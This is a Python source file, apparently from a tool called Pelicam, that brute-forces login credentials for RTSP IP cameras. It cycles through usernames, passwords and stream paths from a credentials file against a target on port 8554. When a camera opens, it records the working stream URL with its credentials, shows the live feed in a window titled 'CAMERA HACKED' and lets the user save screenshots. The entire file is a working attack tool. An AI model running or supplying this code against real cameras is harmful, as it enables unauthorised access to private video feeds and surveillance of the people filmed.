import cv2
import json
import datetime
import os
import scanner

def RTSP_attack(target, factory):
    with open("data/credentials.json", "r") as f: 
        credentials = json.load(f)

    for username in credentials["usernames"]:
        for password in credentials["passwords"]:
            for url_credential in credentials["url_credentials"]:
                url = f"rtsp://{username}:{password}@{target}:8554/{url_credential}"
                print(f"Testing URL : {url}")
                flux = cv2.VideoCapture(url)
                
                if flux.isOpened():
                    with open("results/RTSP Links.txt", "a") as txt:
                        txt.write(f"=---------Camera : {factory}---------=\n")
                        txt.write(f"Constructor : {factory}\n")    
                        txt.write(f"RTSP Link : {url} \n")
                        txt.write(f"Date of scan : {datetime.datetime.now().strftime('%Y-%m-%d %Hh %Mm %Ss')}\n")   
                        txt.write("\n\n")

                    cv2.namedWindow("CAMERA HACKED", cv2.WINDOW_NORMAL)
                    cv2.resizeWindow("CAMERA HACKED", 800, 600)

                    path = os.path.join(os.getcwd(), "results", "Screenshots")
                    os.makedirs(path, exist_ok=True)
                    capture_count = 0 
                    
                    while True:
                        ret, frame = flux.read()
                        if not ret :
                            break 

                        width = cv2.getWindowImageRect("CAMERA HACKED")[2]
                        height = cv2.getWindowImageRect("CAMERA HACKED")[3]
                        frame = cv2.resize(frame, (width, height))

                        cv2.imshow("CAMERA HACKED", frame)
                        key = cv2.waitKey(1)
                        if key == ord("q") or key == 27 or cv2.getWindowProperty("CAMERA HACKED", cv2.WND_PROP_VISIBLE) < 1: # echap / q / croix rouge pour quitter
                            print("Thank you for using Pelicam. See you soon, stay safe and secure !")
                            break
                        elif key == ord("s"):  # s pour screen
                            capture_filename = os.path.join(path, f"Screenshot_{capture_count}.png")
                            cv2.imwrite(capture_filename, frame)
                            print(f"Screenshot taken : {capture_filename}")
                            capture_count += 1

                    flux.release()
                    cv2.destroyAllWindows()
                    return True

    print("Bruteforce attack failed")
    return False

